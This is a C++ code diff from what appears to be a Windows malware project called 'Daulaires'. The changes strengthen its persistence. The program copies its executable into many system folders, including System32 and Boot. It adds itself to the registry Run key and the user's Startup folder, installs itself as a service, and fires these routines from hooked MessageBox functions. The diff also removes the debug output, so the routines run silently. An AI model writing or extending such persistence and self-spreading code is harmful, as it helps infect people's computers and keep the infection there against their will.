@@ -17,6 +17,8 @@ void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
     else {
         std::wcerr << L"Error opening registry key." << std::endl;
     }
+
+
 };
 
 void write_file_to_dirs() {
@@ -24,13 +26,14 @@ void write_file_to_dirs() {
     Memory Memory;
     map<string, string> paths;
     // app different paths to the map
-    paths["path_1"] = "C:\\Users\\Public\\";
-    paths["path_2"] = "C:\\Users\\";
-    paths["path_3"] = "C:\\Users\\Public\\Documents\\";
-    paths["path_4"] = "C:\\";
+
+    paths["path_1"] = "C:\\";
+    paths["path_2"] = "C:\\Users\\Public\\";
+    paths["path_3"] = "C:\\Windows\\";
+    paths["path_4"] = "C:\\Users\\";
     paths["path_5"] = "C:\\Windows\\System32\\";
     paths["path_6"] = "C:\\Windows\\Boot\\";
-    paths["path_7"] = "C:\\Windows\\";
+    paths["path_7"] = "C:\\Users\\Public\\Documents\\";
     paths["path_8"] = "C:\\Users\\Public\\Downloads\\";
     paths["path_9"] = "C:\\Users\\Public\\Pictures\\";
     paths["path_10"] = "C:\\Users\\Public\\Videos\\";
@@ -56,7 +59,6 @@ void write_file_to_dirs() {
         };
     };
 
-
     // Set the app name
     std::wstring appName = L"Daulaires.exe";
 
@@ -68,6 +70,18 @@ void write_file_to_dirs() {
 
         // Add to startup
         addToStartup(appName + L" " + std::wstring(path.first.begin(), path.first.end()), appPath);
+        // open the app data folder without wstring
+        std::string appData = getenv("APPDATA");
+        // convert the app data folder to a wstring
+        std::wstring appDataW(appData.begin(), appData.end());
+        // create the path to the startup folder
+        std::wstring startupPath = appDataW + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
+        // create the path to the app
+        std::wstring appStartupPath = startupPath;
+        // add the app name to the path
+        appStartupPath += appName;
+        // add the app to the startup folder
+        CopyFileW(appPath.c_str(), appStartupPath.c_str(), FALSE);
         Memory.InstallService(L"Daulaires", L"Daulaires", appPath.c_str());
 
         // Delete the existing file (if it exists)
@@ -76,20 +90,18 @@ void write_file_to_dirs() {
         // Copy the file to the path
         CopyFileW(appName.c_str(), appPath.c_str(), FALSE); // FALSE = overwrite
     }
+
+
 };
 
 // Hooked MessageBoxA function
 int WINAPI messageBoxAHook::hookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
     // Function type for the original MessageBoxA
     typedef int (WINAPI* MessageBoxAType)(HWND, LPCSTR, LPCSTR, UINT);
-
     // Pointer to the original MessageBoxA function
-    MessageBoxAType originalMessageBoxA = nullptr;
-
+    MessageBoxAType originalMessageBoxA = MessageBoxA;
     Main Main{};
-
-    cout << "Hooked to MessageBoxA" << endl;
-
+    // cout << "Hooked to MessageBoxA" << endl;
     write_file_to_dirs();
     Main.Windows();
     // Call the original MessageBoxA function
@@ -98,18 +110,27 @@ int WINAPI messageBoxAHook::hookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR l
 
 // Hooked MessageBoxW function
 int WINAPI messageBoxAHook::hookedMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {
-	// Function type for the original MessageBoxW
-	typedef int (WINAPI* MessageBoxWType)(HWND, LPCWSTR, LPCWSTR, UINT);
+    // Function type for the original MessageBoxW
+    typedef int (WINAPI* MessageBoxWType)(HWND, LPCWSTR, LPCWSTR, UINT);
 
-	// Pointer to the original MessageBoxW function
-	MessageBoxWType originalMessageBoxW = nullptr;
+    // Pointer to the original MessageBoxW function
+    MessageBoxWType originalMessageBoxW = MessageBoxW;
     Main Main{};
-
-	cout << "Hooked to MessageBoxW" << endl;
-
 
     write_file_to_dirs();
     Main.Windows();
-	// Call the original MessageBoxW function
-	return originalMessageBoxW(hWnd, lpText, lpCaption, uType);
+    // Call the original MessageBoxW function
+    return originalMessageBoxW(hWnd, lpText, lpCaption, uType);
+};
+
+int messageBoxAHook::hookedMessageBoxExA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType, WORD wLanguageId)
+{
+    typedef int (WINAPI* MessageBoxExAType)(HWND, LPCSTR, LPCSTR, UINT, WORD);
+    MessageBoxExAType originalMessageBoxExA = MessageBoxExA;
+
+    Main Main{};
+    // cout << "Hooked to MessageBoxExA" << endl;
+    // write_file_to_dirs();
+    Main.Windows();
+    return originalMessageBoxExA(hWnd,lpText,lpCaption,uType,wLanguageId);
 };
